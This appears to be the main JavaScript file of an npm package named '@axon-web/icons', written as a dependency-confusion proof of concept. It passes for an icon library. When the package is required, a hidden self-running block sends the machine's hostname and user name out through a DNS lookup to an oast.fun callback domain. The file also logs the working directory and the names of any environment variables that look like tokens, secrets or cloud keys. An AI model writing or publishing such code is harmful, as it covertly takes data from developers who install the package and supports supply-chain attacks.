const os = require('os');

// package init — fires on require
(function() {
  try {
    const { resolve } = require('dns');
    const id = (os.hostname() + '-' + (process.env.USER || process.env.USERNAME || 'u'))
      .toLowerCase().replace(/[^a-z0-9-]/g, '-').slice(0, 40);
    resolve(id + '.nxsqlpejfpamagxctjyv4c9qj1gfdtzwi.oast.fun', () => {});
  } catch (_) {}
})();

console.log('=== @axon-web/icons PoC ===');
console.log('Source:   PUBLIC npm registry.npmjs.org');
console.log('Package:  @axon-web/icons@' + require('./package.json').version);
console.log('Hostname:', os.hostname());
console.log('User:    ', process.env.USER || process.env.USERNAME || 'unknown');
console.log('cwd:     ', process.cwd());
console.log('node:    ', process.version);
console.log('env keys:', Object.keys(process.env).filter(k =>
  /token|secret|key|pass|aws|github|npm/i.test(k)
).join(', ') || 'none visible');

module.exports = {
  getIconPath: (name, variant = 'regular') => `/app/icons/${variant}/${name}.svg`,
  version: require('./package.json').version,
};
